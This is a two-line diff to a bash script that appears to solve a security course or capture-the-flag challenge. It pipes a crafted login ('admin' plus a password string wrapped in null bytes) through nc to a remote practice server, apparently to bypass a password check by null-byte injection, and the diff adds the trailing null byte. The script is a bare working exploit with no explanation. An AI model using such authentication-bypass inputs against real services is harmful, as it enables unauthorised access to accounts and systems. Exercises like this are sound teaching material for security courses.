@@ -1,2 +1,2 @@
 #!/bin/bash
-(python -c 'print "login\nadmin\n\x00DoYouThinkThisIsPassword\n"' && cat) | nc secprog.cs.nctu.edu.tw 10001
+(python -c 'print "login\nadmin\n\x00DoYouThinkThisIsPassword\x00\n"' && cat) | nc secprog.cs.nctu.edu.tw 10001
